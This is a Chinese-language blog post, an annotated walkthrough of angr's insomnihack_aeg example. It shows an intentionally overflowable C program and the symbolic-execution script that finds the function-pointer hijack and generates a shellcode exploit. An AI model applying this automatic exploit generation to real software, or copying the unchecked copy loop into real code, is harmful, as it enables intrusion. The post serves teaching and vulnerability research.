<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="CVE Binary PWN hacker web security angr rex ida hack code python github hexo"><title>Insomnihack_aeg 代码分析 | Mr.Ma3k4H3d</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Insomnihack_aeg 代码分析</h1><a id="logo" href="/.">Mr.Ma3k4H3d</a><p class="description">想要把自己活成一场梦，一首歌，一部电影~</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/Micro8/"><i class="fa fa-archive"> Micro8</i></a><a href="/Papers/"><i class="fa fa-archive"> Papers</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/history/"><i class="fa fa-user"> 历史</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Insomnihack_aeg 代码分析</h1><div class="post-meta">Jan 9, 2019<span> | </span><span class="category"><a href="/categories/Angr/">Angr</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 2k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i><span class="post-count"> 9</span><span class="post-meta-item-text"> 分钟</span></span></span></div><a class="disqus-comment-count" href="/2019/01/09/insomnihack-aeg/#vcomment"><span class="valine-comment-count" data-xid="/2019/01/09/insomnihack-aeg/"></span><span> 条评论</span></a><div class="post-content"><p><a href="https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg" target="_blank" rel="noopener">insomnihack_aeg</a> 为官方提供的示例，用以展示 Angr 利用符号执行进行漏洞挖掘并自动生成 Exploit 的能力。代码 <a href="https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/demo_bin.c" target="_blank" rel="noopener">demo_bin.c</a> 中存在堆溢出漏洞，通过脚本 <a href="https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/solve.py" target="_blank" rel="noopener">solver.py</a> 成功挖掘出该漏洞并自动生成 Exploit。</p>
<a id="more"></a>
<h2 id="0x00-demo-bin-c"><a href="#0x00-demo-bin-c" class="headerlink" title="0x00 demo_bin.c"></a>0x00 demo_bin.c</h2><p>典型的堆溢出，第 21 行，由于未对边界条件进行检查，溢出数据覆盖函数指针，当 38 行调用 do_something() 时，导致 Crash。完整代码如下：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> component_name[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">component</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> (*do_something)(<span class="keyword">int</span> arg);</span><br><span class="line">&#125; <span class="keyword">comp_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sample_func</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" - %s - recieved argument %d\n"</span>, component_name, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">comp_t</span> *initialize_component(<span class="keyword">char</span> *cmp_name) &#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">comp_t</span> *cmp;</span><br><span class="line"></span><br><span class="line">    cmp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct component));</span><br><span class="line">    cmp-&gt;do_something = sample_func;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Copying component name...\n"</span>); </span><br><span class="line">    <span class="keyword">while</span> (*cmp_name)</span><br><span class="line">        cmp-&gt;name[i++] = *cmp_name++;</span><br><span class="line"></span><br><span class="line">    cmp-&gt;name[i] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> cmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">comp_t</span> *cmp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Component Name:\n"</span>);</span><br><span class="line">    read(<span class="number">0</span>, component_name, <span class="keyword">sizeof</span> component_name);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Initializing component...\n"</span>);</span><br><span class="line">    cmp = initialize_component(component_name);    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Running component...\n"</span>);</span><br><span class="line">    cmp-&gt;do_something(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x01-Solve-py"><a href="#0x01-Solve-py" class="headerlink" title="0x01 Solve.py"></a>0x01 Solve.py</h2><p>漏洞原理很简单，不再赘述。利用符号执行判断是否存在控制流劫持，关键在于检测 EIP，若 EIP 完全被符号变量覆盖，则代表着控制流已被劫持。完整的 AEG 过程如下：<br>1）漏洞挖掘，带有前置约束及路径选择策略的符号执行；<br>2）分析发生崩溃时的 EIP 状态；<br>3）分析发生崩溃时的内存布局<br>4）构造约束条件；<br>5）约束求解，生成 Exploit。</p>
<h3 id="1、漏洞挖掘"><a href="#1、漏洞挖掘" class="headerlink" title="1、漏洞挖掘"></a>1、漏洞挖掘</h3><p>脚本中第 13 ~ 24 行，利用 SimulationManager 的 step() 方法，搜索二进制程序的状态空间。由于代码逻辑较为简单，因此在路径探索的过程中并未添加缓解路径爆炸的前置约束，也未采用路径选择策略，仅使用简单的 step()。循环执行，直到出现 <code>unconstrained</code> 状态。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">p = angr.Project(binary)</span><br><span class="line"></span><br><span class="line">binary_name = os.path.basename(binary)</span><br><span class="line"></span><br><span class="line">extras = &#123;so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY&#125;</span><br><span class="line">es = p.factory.entry_state(add_options=extras)</span><br><span class="line">sm = p.factory.simulation_manager(es, save_unconstrained=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># find a bug giving us control of PC</span></span><br><span class="line">l.info(<span class="string">"looking for vulnerability in '%s'"</span>, binary_name)</span><br><span class="line">exploitable_state = <span class="keyword">None</span></span><br><span class="line"><span class="keyword">while</span> exploitable_state <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    print(sm)</span><br><span class="line">    sm.step()</span><br><span class="line">    <span class="keyword">if</span> len(sm.unconstrained) &gt; <span class="number">0</span>:</span><br><span class="line">        l.info(<span class="string">"found some unconstrained states, checking exploitability"</span>)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> sm.unconstrained:</span><br><span class="line">            <span class="keyword">if</span> fully_symbolic(u, u.regs.pc):</span><br><span class="line">                exploitable_state = u</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># no exploitable state found, drop them</span></span><br><span class="line">        sm.drop(stash=<span class="string">'unconstrained'</span>)</span><br><span class="line"></span><br><span class="line">l.info(<span class="string">"found a state which looks exploitable"</span>)</span><br><span class="line">ep = exploitable_state</span><br></pre></td></tr></table></figure>
<h3 id="2、分析-EIP"><a href="#2、分析-EIP" class="headerlink" title="2、分析 EIP"></a>2、分析 EIP</h3><p>当检测到 <code>unconstrained states</code> 时，调用 <code>fully_symbolic()</code>方法，查看 EIP 中符号变量的数量。当 EIP 完全被符号变量覆盖时，代表控制流已被劫持。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fully_symbolic</span><span class="params">(state, variable)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    check if a symbolic variable is completely symbolic</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(state.arch.bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> state.solver.symbolic(variable[i]):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<p><code>fully_symbolic()</code>接收 state、variable 两个输入，用 state.arch.bits 判断所模拟系统的字长（The number of bits in a word），用 <code>symbolic()</code> 检测传入数据是否为符号值。该方法在“./angr/state_plugins/solver.py”中，实现代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">symbolic</span><span class="params">(self, e)</span>:</span> <span class="comment"># pylint: disable=R0201</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns True if the expression `e` is symbolic.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> type(e) <span class="keyword">in</span> (int, bytes, float, bool):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> e.symbolic</span><br></pre></td></tr></table></figure>
<p>在触发漏洞时，堆及 EIP 状态如下图所示。<br><img src="/2019/01/09/insomnihack-aeg/heap.png" alt=""><br>调试结果如下：<br><img src="/2019/01/09/insomnihack-aeg/eip.png" alt=""></p>
<h3 id="3、分析内存状态"><a href="#3、分析内存状态" class="headerlink" title="3、分析内存状态"></a>3、分析内存状态</h3><p>在满足<code>unconstrained</code>，且 EIP 完全被符号变量覆盖时，通过 <code>find_symbolic_buffer()</code> 检测内存中符号变量的布局情况，并构造约束条件。整个环节可分为查找符号输入、追踪符号变量、构造约束条件三个步骤。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># keep checking if buffers can hold our shellcode</span></span><br><span class="line"><span class="keyword">for</span> buf_addr <span class="keyword">in</span> find_symbolic_buffer(ep, len(shellcode)):</span><br><span class="line">    l.info(<span class="string">"found symbolic buffer at %#x"</span>, buf_addr)</span><br><span class="line">    memory = ep.memory.load(buf_addr, len(shellcode))</span><br><span class="line">    sc_bvv = ep.solver.BVV(shellcode)</span><br></pre></td></tr></table></figure>
<p>1）查找符号输入<br>查找符号输入、追踪符号变量在<code>find_symbolic_buffer()</code>中实现，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_symbolic_buffer</span><span class="params">(state, length)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's</span></span><br><span class="line"><span class="string">    control</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get all the symbolic bytes from stdin</span></span><br><span class="line">    stdin = state.posix.stdin</span><br><span class="line"></span><br><span class="line">    sym_addrs = [ ]</span><br><span class="line">    <span class="keyword">for</span> _, symbol <span class="keyword">in</span> state.solver.get_variables(<span class="string">'file'</span>, stdin.ident):</span><br><span class="line">        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> sym_addrs:</span><br><span class="line">        <span class="keyword">if</span> check_continuity(addr, sym_addrs, length):</span><br><span class="line">            <span class="keyword">yield</span> addr</span><br></pre></td></tr></table></figure>
<p>此处需注意，Angr 在处理 scanf 的输入数据时，采用 streams 模式。不仅如此，默认情况下，stdin、stdout、stderr 均采用该模式。<a href="https://github.com/angr/angr-doc/blob/139150e496ee00dea741639e841f0f6123070716/docs/file_system.md" target="_blank" rel="noopener">原文如下</a>  </p>
<blockquote>
<p>Believe it or not, this simpler abstraction for streams will benefit symbolic execution. Consider an example program that calls scanf N times to read in N strings. With a traditional SimFile, as we do not know the length of each input string, there does not exist any clear boundary in the file between these symbolic input strings. In this case, angr will perform N symbolic reads where each read will generate a gigantic tree of claripy ASTs, with string lengths being symbolic. This is a nightmare for constraint solving. Nevertheless, the fact that scanf is used on a stream (stdin) dictates that there will be zero overlap between individual reads, regardless of the sizes of each symbolic input string. We may as well model stdin as a stream that comprises of consecutive packets, instead of a file containing a sequence of bytes. Each of the packet can be of a fixed length or a symbolic length. Since there will be absolutely no byte overlap between packets, the constraints that angr will produce after executing this example program will be a lot simpler.<br>The key concept involved is “short reads”, i.e. when you ask for n bytes but actually get back fewer bytes than that. We use a different class implementing SimFileBase, SimPackets, to automatically enable support for short reads. By default, stdin, stdout, and stderr are all SimPackets objects.</p>
</blockquote>
<p>调试结果与文档描述一致：<br><img src="/2019/01/09/insomnihack-aeg/stdin.png" alt=""></p>
<p>2) 追踪符号变量<br><code>state.posix.stdin</code>为传入程序的全部符号变量，使用<code>state.solver.get_variables()</code> 追踪内存中的符号变量。该函数位于“./angr/state_plugins/solver.py”中，代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_variables</span><span class="params">(self, *keys)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Iterate over all variables for which their tracking key is a prefix of the values provided.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Elements are a tuple, the first element is the full tracking key, the second is the symbol.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables('mem'))</span></span><br><span class="line"><span class="string">    [(('mem', 0x1000), &lt;BV64 mem_1000_4_64&gt;), (('mem', 0x1008), &lt;BV64 mem_1008_5_64&gt;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables('file'))</span></span><br><span class="line"><span class="string">    [(('file', 1, 0), &lt;BV8 file_1_0_6_8&gt;), (('file', 1, 1), &lt;BV8 file_1_1_7_8&gt;), (('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables('file', 2))</span></span><br><span class="line"><span class="string">    [(('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables())</span></span><br><span class="line"><span class="string">    [(('mem', 0x1000), &lt;BV64 mem_1000_4_64&gt;), (('mem', 0x1008), &lt;BV64 mem_1008_5_64&gt;), (('file', 1, 0), &lt;BV8 file_1_0_6_8&gt;), (('file', 1, 1), &lt;BV8 file_1_1_7_8&gt;), (('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> self.eternal_tracked_variables.items():</span><br><span class="line">        <span class="keyword">if</span> len(k) &gt;= len(keys) <span class="keyword">and</span> all(x == y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(keys, k)):</span><br><span class="line">            <span class="keyword">yield</span> k, v</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> self.temporal_tracked_variables.items():</span><br><span class="line">        <span class="keyword">if</span> k[<span class="number">-1</span>] <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> len(k) &gt;= len(keys) <span class="keyword">and</span> all(x == y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(keys, k)):</span><br><span class="line">            <span class="keyword">yield</span> k, v</span><br></pre></td></tr></table></figure>
<p>返回值为元组，调试结果如下:<br><img src="/2019/01/09/insomnihack-aeg/symbol.png" alt=""></p>
<p>  通过 state.memory.addrs_for_name() 返回包含符号变量的内存地址。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addrs_for_name</span><span class="params">(self, n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns addresses that contain expressions that contain a variable</span></span><br><span class="line"><span class="string">    named `n`.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> self.mem.addrs_for_name(n)</span><br></pre></td></tr></table></figure>
<p>调试结果：<br><img src="/2019/01/09/insomnihack-aeg/mem.png" alt=""><br>至此，已能够通过输入数据控制 EIP 以及部分内存空间，后续要考虑的是 Payload 的布局问题。  </p>
<p>3）构造约束条件<br>Exploit 采用 ret2text 方式且不考虑安全机制，因此仅需找到一片足以放置 shellcode 的连续地址即可。示例中 shellcode 大小为 22。检查空间连续性的函数如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_continuity</span><span class="params">(address, addresses, length)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    dumb way of checking if the region at 'address' contains 'length' amount of controlled</span></span><br><span class="line"><span class="string">    memory.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> address + i <span class="keyword">in</span> addresses:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<p>成功执行后，返回满足条件的起始地址，并将shellcode 转换为 BVV。   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memory = ep.memory.load(buf_addr, len(shellcode))</span><br><span class="line">sc_bvv = ep.solver.BVV(shellcode)</span><br></pre></td></tr></table></figure>
<p>至此，构造生成 Exploit 的约束条件如下： </p>
<ul>
<li><code>memory == sc_bvv</code></li>
<li><code>ep.regs.pc == buf_addr</code>  </li>
</ul>
<h3 id="4、约束求解"><a href="#4、约束求解" class="headerlink" title="4、约束求解"></a>4、约束求解</h3><p>通过 satisfiable() 检查约束条件是否可解。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># check satisfiability of placing shellcode into the address</span></span><br><span class="line">    <span class="keyword">if</span> ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)):</span><br><span class="line">        l.info(<span class="string">"found buffer for shellcode, completing exploit"</span>)</span><br><span class="line">        ep.add_constraints(memory == sc_bvv)</span><br><span class="line">        l.info(<span class="string">"pointing pc towards shellcode buffer"</span>)</span><br><span class="line">        ep.add_constraints(ep.regs.pc == buf_addr)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>约束可解，生成 Exploit。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'%s-exploit'</span> % binary_name</span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ep.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">print(<span class="string">"%s exploit in %s"</span> % (binary_name, filename))</span><br><span class="line">print(<span class="string">"run with `(cat %s; cat -) | %s`"</span> % (filename, binary))</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/09/insomnihack-aeg/exp.png" alt=""></p>
<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>该示例完整展示了 AEG 的全过程。通过调试，加深了对符号执行的理解。由于本例并不涉及符号执行所面临的路径爆炸与路径选择，因此对于理解前置约束条件及路径选择策略的助益并不明显，但对于理解符号变量以及内存布局还是起到一些作用。对于 AEG 来说，由于约束求解的问题不在考虑范围之内，控制流劫持的检测基本聚焦为 EIP 的检测。因此，如何根据崩溃点的内存布局及 Payload 情况，构造出合适的约束条件，成为问题的关键。</p>
</div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Mr.Ma3k4H3d</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="/2019/01/09/insomnihack-aeg/">http://maskhed.github.io/2019/01/09/insomnihack-aeg/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 CN 许可协议。转载请注明出处！</li></ul></div><br><div class="tags"></div><div class="post-nav"><a class="pre" href="/2019/01/17/Rex-stacksmash/">Rex：实例分析 test_linux_stacksmash()</a><a class="next" href="/2018/12/20/Vulnerability-Analysis-Method/">软件漏洞分析</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'c83TWDMv2OITOkIl6Ns8OKOn-gzGzoHsz',
  appKey:'M0S2DqxNmklrFmf8VjUhv6WB',
  placeholder:'坚持原创技术分享，您的支持将鼓励我继续创作！',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AEG/">AEG</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Angr/">Angr</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔杂谈/">随笔杂谈</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/CGC/" style="font-size: 15px;">CGC</a> <a href="/tags/CVE/" style="font-size: 15px;">CVE</a> <a href="/tags/Mr-Robot/" style="font-size: 15px;">Mr.Robot</a> <a href="/tags/SS/" style="font-size: 15px;">SS</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/08/风雨兼程/">即使风雨兼程，也能守得云开见月明</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/04/ReadingList/">ReadingList</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/23/rex-crash/">Rex：源码分析 -- Crash Analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/17/Rex-stacksmash/">Rex：实例分析 test_linux_stacksmash()</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/09/insomnihack-aeg/">Insomnihack_aeg 代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/20/Vulnerability-Analysis-Method/">软件漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/Angr-1/">Part 1： Angr Internals</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/14/Pwnable-3/">Pwnable（三）</a></li><li 